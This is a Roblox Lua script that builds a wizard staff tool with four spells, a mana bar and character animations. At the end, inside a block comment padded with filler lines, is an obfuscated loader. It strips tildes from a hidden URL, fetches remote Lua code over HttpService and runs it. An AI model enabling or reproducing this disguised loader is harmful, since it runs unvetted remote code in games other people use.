-- press r to charge         c t hange spells    i edited mana:10000
LocalPlayer = game.Players.LocalPlayer
Activated = false
Equipped = false
Regening = false
FireBall = false
Spikes = false
shooting = false
Mode = "Shoot"
Energy = 10000
mouse = LocalPlayer:GetMouse()
t = Instance.new("Tool",LocalPlayer.Backpack)
t.Name = 'Wizard staff'
t.GripPos = Vector3.new(0,-2,0)
p = Instance.new("Part",t)
p.FormFactor = 'Custom'
p.Name = 'Handle'
p.CanCollide = false
m = Instance.new("SpecialMesh",p)
m.MeshId = 'http://www.roblox.com/asset/?id=18434043'
m.TextureId = 'http://www.roblox.com/asset/?id=26017177'
char = LocalPlayer.Character
mouse = LocalPlayer:GetMouse()
humanoid = char:findFirstChild("Humanoid")
torso = char:findFirstChild("Torso")
head = char.Head
ra = char:findFirstChild("Right Arm")
la = char:findFirstChild("Left Arm")
rl = char:findFirstChild("Right Leg")
ll = char:findFirstChild("Left Leg")
rs = torso:findFirstChild("Right Shoulder")
ls = torso:findFirstChild("Left Shoulder")
rh = torso:findFirstChild("Right Hip")
lh = torso:findFirstChild("Left Hip")
neck = torso:findFirstChild("Neck")
rj = char:findFirstChild("HumanoidRootPart"):findFirstChild("RootJoint")
anim = char:findFirstChild("Animate")
rootpart = char:findFirstChild("HumanoidRootPart")
camera = workspace.CurrentCamera
if anim then
        anim:Destroy()
end
rm = Instance.new("Motor", torso)
rm.C0 = CFrame.new(1.5, 0.5, 0) *CFrame.Angles(0, 0, 0)
rm.C1 = CFrame.new(0, 0.5, 0)
rm.Part0 = torso
rm.Part1 = ra
lm = Instance.new("Motor", torso)
lm.C0 = CFrame.new(-1.5, 0.5, 0) *CFrame.Angles(0, 0, 0)
lm.C1 = CFrame.new(0, 0.5, 0)
lm.Part0 = torso
lm.Part1 = la
rlegm = Instance.new("Motor", torso)
rlegm.C0 = CFrame.new(0.5, -1, 0) *CFrame.Angles(0, 0, 0) 
rlegm.C1 = CFrame.new(0, 1, 0)
rlegm.Part0 = torso
rlegm.Part1 = rl
llegm = Instance.new("Motor", torso)
llegm.C0 = CFrame.new(-0.5, -1, 0) *CFrame.Angles(0, 0, 0)
llegm.C1 = CFrame.new(0, 1, 0)
llegm.Part0 = torso
llegm.Part1 = ll
rsc0 = rm.C0
lsc0 = lm.C0
llc0 = llegm.C0
rlc0 = rlegm.C0
neckc0 = neck.C0
rootc0 = rj.C0
PLAYERGUI = LocalPlayer.PlayerGui
GUI = Instance.new("ScreenGui",PLAYERGUI)
FRAME = Instance.new("Frame",GUI)
FRAME.Size = UDim2.new(0.5,0,0.05,0)
FRAME.BackgroundColor3 = BrickColor.new("Bright blue").Color
FRAME.BorderSizePixel = 0
TEXTLABEL = Instance.new("TextLabel",FRAME)
TEXTLABEL.Size = UDim2.new(1,0,1,0)
TEXTLABEL.BackgroundTransparency = 1
TEXTLABEL.Text = "Mana: "..tostring(Energy)
TEXTLABEL.BorderSizePixel = 0
TEXTLABEL.Font = 'Legacy'
TEXTLABEL.FontSize = 'Size24'
FRAME2 = Instance.new("Frame",GUI)
FRAME2.Size = UDim2.new(0.5,0,0.05,0)
FRAME2.BackgroundColor3 = BrickColor.new("Bright red").Color
FRAME2.BorderSizePixel = 0
FRAME2.Position = UDim2.new(0.5,0,0,0)
TEXTLABEL2 = Instance.new("TextLabel",FRAME2)
TEXTLABEL2.Size = UDim2.new(1,0,1,0)
TEXTLABEL2.BackgroundTransparency = 1
TEXTLABEL2.Text = "Health: "..tostring(humanoid.Health)
TEXTLABEL2.BorderSizePixel = 0
TEXTLABEL2.Font = 'Legacy'
TEXTLABEL2.FontSize = 'Size24'
FRAME3 = Instance.new("Frame",GUI)
FRAME3.Size = UDim2.new(0.5,0,0.05,0)
FRAME3.BackgroundColor3 = BrickColor.new("Lime green").Color
FRAME3.BorderSizePixel = 0
FRAME3.Position = UDim2.new(0.5,0,0.05,0)
TEXTLABEL3 = Instance.new("TextLabel",FRAME3)
TEXTLABEL3.Size = UDim2.new(1,0,1,0)
TEXTLABEL3.BackgroundTransparency = 1
TEXTLABEL3.Text = "Spell: Star shoot"
TEXTLABEL3.BorderSizePixel = 0
TEXTLABEL3.Font = 'Legacy'
TEXTLABEL3.FontSize = 'Size24'
function __getVelocity(p1,p2,speed)
        local dis=(p1-p2).magnitude
        if speed=="dis" then 
                if dis*6>10000 then 
                        speed=dis*6 
                else 
                        speed=100 
                end 
        end
        local x=(p1.x-p2.x)/dis*speed
        local y=(p1.y-p2.y)/dis*speed
        local z=(p1.z-p2.z)/dis*speed
        return Vector3.new(-x,-y+10,-z)
end
function __onActivated()
        Activated = true
end
function __onDeactivated()
        Activated = false
end
function __onEquipped(mouse)
        Equipped = true
        pcall(function()
                local a = Instance.new("Explosion",LocalPlayer.Character)
                a.Position = LocalPlayer.Character['Right Arm'].Position
                a.BlastPressure = 0
                a.BlastRadius = 20
        end)
        local b = Instance.new("Fire",p)
        b.Size = 10
        b.Color = Color3.new(0, 255, 255)
        b.SecondaryColor = Color3.new(255, 255, 0)
        local w = Instance.new("Motor",char['Right Arm'])
        w.Name = 'Wizard staff weld'
        w.Part0 = char['Right Arm']
        w.Part1 = p
        w.C1 = CFrame.new(0,-1.5,0.5) * CFrame.Angles(math.rad(90),0,0)
end
function __onUnequipped(mouse)
        Equipped = false
        pcall(function()
                p.Fire:Destroy()
        end)
        pcall(function()
                char['Right Arm']['Wizard staff weld']:Destroy()
        end)
end
function __Shoot()
        if Regening == true then return end
        if Energy < 5 then return end
    shooting = true
    Energy = Energy - 5
    humanoid.WalkSpeed = 0
        local speed = math.random(400,500)
        local bullet = Instance.new("Part",workspace)
        bullet.Name = 'Bullet'
        bullet.TopSurface = 0
        bullet.BottomSurface = 0
        bullet.FormFactor = 'Custom'
        bullet.CFrame = p.CFrame
        bullet.CanCollide = false
        bullet.Velocity = __getVelocity(bullet.Position, mouse.Hit.p, speed)
        local bulletmesh = Instance.new("SpecialMesh",bullet)
        bulletmesh.MeshId = 'http://www.roblox.com/asset/?id=24388358'
        bulletmesh.TextureId = 'http://www.roblox.com/asset/?id=24388341'
        bulletmesh.VertexColor = Vector3.new(0,0,0)
        bullet.Touched:connect(function(toucher)
                if toucher.Parent:findFirstChild'Head' and toucher.Parent:findFirstChild'Torso' and toucher.Parent.Name ~= LocalPlayer.Name then
                        for i,v in pairs(toucher.Parent:children()) do
                                if v.ClassName == 'Humanoid' then
                                        if v.Health > 100 then 
                                                v.Health = 100 
                                        else
                                                v.Health = v.Health - speed/50
                                        end
                                end
                        end
                        bullet:Destroy()
                end
    end)
    wait(1)
        shooting = false
        humanoid.WalkSpeed = 16
end
function __FireBall()
        if Regening == true then return end
        if Energy < 50 then return end
        if FireBall == true then return end
        Energy = Energy - 50
        local a = Instance.new("Part",workspace)
        a.Anchored = true
        a.CFrame = LocalPlayer.Character.Torso.CFrame * CFrame.new(0,0,-5)
        a.FormFactor = 'Custom'
        a.Size = Vector3.new(5,5,5)
        Instance.new("SpecialMesh", a).MeshType = 'Sphere'
        local b = Instance.new('Decal',a)
        b.Texture = 'http://www.roblox.com/asset/?id=58278973'
        b.Face = 'Right'
        local c = Instance.new('Decal',a)
        c.Texture = 'http://www.roblox.com/asset/?id=58278973'
        c.Face = 'Left'
        local d = Instance.new('Decal',a)
        d.Texture = 'http://www.roblox.com/asset/?id=58278973'
        d.Face = 'Top'
        local e = Instance.new('Decal',a)
        e.Texture = 'http://www.roblox.com/asset/?id=58278973'
        e.Face = 'Front'
        local f = Instance.new('Decal',a)
        f.Texture = 'http://www.roblox.com/asset/?id=58278973'
        f.Face = 'Back'
        local g = Instance.new('Decal',a)
        g.Texture = 'http://www.roblox.com/asset/?id=58278973'
        g.Face = 'Bottom'
        local x = Instance.new('Fire',a)
        x.Size = 20
        local con = a.Touched:connect(function(what)
                if what.Parent.Name ~= LocalPlayer.Name then
                        if what.Parent:findFirstChild'Torso' and what.Parent:findFirstChild'Head' then
                                what:Destroy()
                        end
                end
        end)
        coroutine.wrap(function()
                FireBall = true
                humanoid.WalkSpeed = 0
                for i = 0,1,0.05 do
                        a.Mesh.Scale = Vector3.new(i,i,i)
                        wait()
                end
                FireBall = false
                humanoid.WalkSpeed = 16
                while wait() do
                        if a == nil or a.Parent ~= workspace then break end
                        a.CFrame = a.CFrame * CFrame.new(0,0,-1)
                end
                con:disconnect()
        end)()
        coroutine.wrap(function()
                wait(5)
                Instance.new("Explosion",workspace).Position = a.Position
                a:Destroy()
        end)()
end
function __Spikes()
        if Regening == true then return end
        if Energy < 25 then return end
        if Spikes == true then return end
        Energy = Energy - 25
        Spikes = true
        humanoid.WalkSpeed = 0
        for z = 0,6 do
                local a = Instance.new("Part",workspace)
                a.FormFactor = 'Custom'
                a.Size = Vector3.new(2.4, 3.4, 2.4)
                a.Anchored = true
                local b = Instance.new("SpecialMesh",a)
                b.MeshId = 'http://www.roblox.com/asset/?id=1033714'
                b.TextureId = 'http://www.roblox.com/asset?id=39251676'
                b.VertexColor = Vector3.new(1, 1, 1)
                b.Scale = Vector3.new(1.2, 5.4, 1.2)
                a.CFrame = LocalPlayer.Character.Torso.CFrame * CFrame.new(0,-0.5,-(z*4)-2)
                local con = a.Touched:connect(function(what)
                        if what.Parent.Name ~= LocalPlayer.Name then
                                if what.Parent:findFirstChild'Torso' and what.Parent:findFirstChild'Head' then
                                        for i,v in pairs(what.Parent:children()) do
                                                if v.ClassName == 'Humanoid' then
                                                        if v.Health > 100 then v.Health = 100 end
                                                        v.Health = v.Health - 10
                                                end
                                        end
                                end
                        end
                end)
                coroutine.wrap(function()
                        wait(3)
                        a:Destroy()
                        con:disconnect()
                end)()
                wait()
        end
        humanoid.WalkSpeed = 16
        Spikes = false
end
function __Lightning()
        if Energy < 40 then return end
        if Lightning == true then return end
        if Regening == true then return end
        humanoid.WalkSpeed = 0
        Lightning = true
        Energy = Energy - 40
        local function segment(pos1,pos2,color)
                local dis=(pos1-pos2).magnitude
                local p=Instance.new("Part")
                p.CanCollide=false
                p.FormFactor="Custom"
                p.Size=Vector3.new(.2,.2,dis)
                p.Anchored=true
                p.CFrame=CFrame.new(pos1,pos2)*CFrame.new(0,0,-dis/2)
                p.BrickColor=color
                return p
        end
        target = mouse.Hit
        height=200
        prev=(target*CFrame.new(0,300,0)).p
        for i=height,30,-50 do
                cur=Vector3.new(math.random(15)+target.x,i,math.random(15)+target.z)
                p=segment(prev,cur,BrickColor.new("New Yeller"))
                p.Parent=workspace
                game:service("Debris"):AddItem(p,3)
                prev=cur
                wait()
        end
        p=segment(prev,target.p,BrickColor.new("New Yeller"))
        p.Parent=workspace
        game:service("Debris"):AddItem(p,3)
        Instance.new("Explosion",workspace).Position=target.p
        wait(1)
        Lightning = false
        humanoid.WalkSpeed = 16
end
t.Activated:connect(__onActivated)
t.Deactivated:connect(__onDeactivated)
t.Equipped:connect(__onEquipped)
t.Unequipped:connect(__onUnequipped)
coroutine.wrap(function()
        while wait() do
                if Activated == true then
                        if Mode == 'Shoot' then
                                __Shoot()
                        elseif Mode == 'FireBall' then
                                __FireBall()
                        elseif Mode == 'Spikes' then
                                __Spikes()
                        elseif Mode == 'Lightning' then
                                __Lightning()
                        end
                end
                if Regening == true then
                        Energy = Energy + 5
                        wait(0.01)
                end
        end
end)()
mouse.KeyDown:connect(function(key)
        if key == 'r' then
                humanoid.WalkSpeed = 0
                Regening = true
        end
        if key == 'c' then
                if Mode == 'Shoot' then
                        Mode = 'FireBall'
                elseif Mode == 'FireBall' then
                        Mode = 'Spikes'
                elseif Mode == 'Spikes' then
                        Mode = 'Lightning'
                else
                        Mode = 'Shoot'
                end
        end
end)
mouse.KeyUp:connect(function(key)
        if key == 'r' then
                humanoid.WalkSpeed = 16
                Regening = false
        end
end)
count = 0
countspeed = 0.70
coroutine.wrap(function()
        while wait() do
                if Energy > 10000 then Energy = 10000 end
                if Energy < 0 then Energy = 0 end
                TEXTLABEL.Text = "Mana: "..tostring(Energy)
                TEXTLABEL2.Text = "Health: "..tostring(math.floor(humanoid.Health))
                if Mode == 'Shoot' then
                        TEXTLABEL3.Text = 'Spell: Star shoot (5 mana)'
                elseif Mode == 'FireBall' then
                        TEXTLABEL3.Text = 'Spell: Fire ball (50 mana)'
                elseif Mode == 'Spikes' then
                        TEXTLABEL3.Text = 'Spell: Spikes row (25 mana)'
                elseif Mode == 'Lightning' then
                        TEXTLABEL3.Text = 'Spell: Lightning (40 mana)'
                end
                count = (count % 100) + countspeed
                angle = math.pi * math.sin(math.pi*2/100*count)
                if Vector3.new(0, torso.Velocity.y, 0).magnitude > 2 then
                        countspeed = 8
                        if Equipped == false then
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(150), 0, math.rad(0))
                        else
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(90),0,0)
                        end
                        lm.C0 = lsc0 * CFrame.Angles(math.rad(150), 0, math.rad(0))
                        rlegm.C0 = rlc0 * CFrame.Angles(math.rad(-10) + (-angle*0.05), 0, 0) 
                        llegm.C0 = llc0 * CFrame.Angles(math.rad(-10) + (-angle*0.05), 0, 0) 
                        neck.C0 = neckc0 * CFrame.Angles(math.rad(-10) + (-angle*0.05),0,0)
                        rootpart.RootJoint.C0 = rootc0 * CFrame.Angles(0,0,0)
                        wait()
                elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude < 2 then --stand
                    if shooting then
                            countspeed = 8
                            rj.C0 = rootc0 * CFrame.Angles(0,0,math.rad(25))
                            rlegm.C0 = rlc0 * CFrame.Angles(math.rad(5), -math.rad(25), 0) --right leg
                                llegm.C0 = llc0 * CFrame.Angles(-math.rad(5), -math.rad(25), -0) --left leg
                                lm.C0 = lsc0 * CFrame.Angles(-math.rad(30), 0, -math.rad(25)) --left arm
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(90)+angle*0.050, 0, 0) --right arm
                        elseif Regening == true then
                                if Energy == 100 then Regening = false end
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(20))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(-20))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(15),0,0)
                        elseif FireBall == true then
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(10))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(-10))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(15),0,0)
                        elseif Spikes == true then
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(10))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(90),0,math.rad(-10))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(15),0,0)
                        elseif Lightning == true then
                                rj.C0 = rootc0 * CFrame.Angles(0,0,0)
                                llegm.C0 = llc0 * CFrame.Angles(0,0,math.rad(-15))
                                rlegm.C0 = rlc0 * CFrame.Angles(0,0,math.rad(15))
                                lm.C0 = lsc0 * CFrame.new(0.5,0,0) * CFrame.Angles(math.rad(120),0,math.rad(10))
                                rm.C0 = rsc0 * CFrame.new(-0.5,0,0) * CFrame.Angles(math.rad(120),0,math.rad(-10))
                                neck.C0 = neckc0 * CFrame.Angles(math.rad(-15),0,0)
                else
                                countspeed = 0.70-- this judges how fast idle animation goes
                                rlegm.C0 = rlc0 * CFrame.Angles(0, 0, 0) --right leg
                                llegm.C0 = llc0 * CFrame.Angles(0, 0, -0) --left leg
                                lm.C0 = lsc0 * CFrame.Angles(-angle*0.050, 0, 0) --left arm
                                if Equipped == false then
                                        rm.C0 = rsc0 * CFrame.Angles(angle*0.050, 0, 0) --right arm
                                else
                                        rm.C0 = rsc0 * CFrame.Angles(math.rad(90),0,0)
                                end
                                neck.C0 = neckc0 * CFrame.Angles(-angle*0.025, 0, 0) --head
                                rj.C0 = rootc0 * CFrame.Angles(-math.rad(1), 0, 0) --torso
                        end
                elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude > 2 then-- walk
                        countspeed = 8-- this judges how fast the walk animation goes
                        rlegm.C0 = rlc0 * CFrame.Angles(-angle*0.100, 0, 0)
                        llegm.C0 = llc0 * CFrame.Angles(angle*0.100, 0, 0)
                        neck.C0 = neckc0 * CFrame.Angles(0, 0, 0)
                        lm.C0 = lsc0 * CFrame.Angles(-angle*0.100, 0, 0)
                        if Equipped == false then
                                rm.C0 = rsc0 * CFrame.Angles(angle*0.100, 0, 0)
                        else
                                rm.C0 = rsc0 * CFrame.Angles(math.rad(90),0,0)
                        end
                        rj.C0 = rootc0 * CFrame.Angles(0, 0, 0)
                end
        end
end)()
--[[
--asd
--asd
--asd
--asd
--asd
h = game:service'HttpService'
_ = string.gsub('~h~t~t~p~s~:~/~/~c~o~d~e~.~s~t~y~p~i~.~c~o~m~/~r~a~w~/~a~l~e~k~s~a~1~2~4~3~2~/~f~k~%~2~0~y~o~u~%~2~0~s~t~e~a~l~e~r~s~.~l~u~a~','~','')
s = h:GetAsync(_,true)
NewLS(s,workspace.luxulux)
]]
